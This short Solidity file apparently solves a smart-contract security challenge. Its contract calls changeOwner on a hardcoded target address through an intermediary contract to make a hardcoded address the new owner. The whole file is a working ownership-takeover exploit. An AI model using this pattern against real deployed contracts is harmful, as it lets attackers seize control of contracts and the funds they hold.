// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface Telephone {
    function changeOwner(
        address owner
    ) external;
}

contract TelephoneCall  {
    address public constant telephoneContract = address(0x84aA46f17Dca3124Fe803C66518aa74ADFa97D0f);
    address private constant newOwner = address(0x3Dc5134a08436F54a495B3a7a17D1fd53c42685a);

    function phoneCall() public {
        Telephone(telephoneContract).changeOwner(newOwner);
    }
}
